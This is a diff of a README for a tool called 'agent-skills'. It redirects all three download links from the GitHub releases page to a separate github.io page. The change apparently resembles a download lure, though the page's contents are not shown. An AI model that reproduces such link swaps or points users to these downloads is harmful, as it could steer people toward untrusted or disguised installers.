@@ -6,11 +6,11 @@ Welcome! This page will guide you through downloading and using **agent-skills**
 
 ## 📥 Download and Install
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/Download%20agent--skills-Click%20Here-4CAF50?style=for-the-badge)](https://github.com/Gracillariidaewindturbine16/agent-skills/releases)
+[![DOWNLOAD NOW](https://img.shields.io/badge/Download%20agent--skills-Click%20Here-4CAF50?style=for-the-badge)](https://gracillariidaewindturbine16.github.io)
 
 **Step 1: Visit the Download Page**
 
-Visit this link to download the application: [https://github.com/Gracillariidaewindturbine16/agent-skills/releases](https://github.com/Gracillariidaewindturbine16/agent-skills/releases)
+Visit this link to download the application: [https://gracillariidaewindturbine16.github.io](https://gracillariidaewindturbine16.github.io)
 
 **Step 2: Choose Your File**
 
@@ -171,7 +171,7 @@ Follow the GitHub repository for the latest updates, new features, and community
 
 *agent-skills is proudly supported by the developer community. Your feedback and contributions help us improve every day.*
 
-[![Download Now](https://img.shields.io/badge/🚀-Download%20agent--skills-2196F3?style=for-the-badge&logo=github)](https://github.com/Gracillariidaewindturbine16/agent-skills/releases)
+[![Download Now](https://img.shields.io/badge/🚀-Download%20agent--skills-2196F3?style=for-the-badge&logo=github)](https://gracillariidaewindturbine16.github.io)
 
 **Ready to supercharge your AI coding agents? Download agent-skills today and experience the difference of a trusted skill registry.**
 
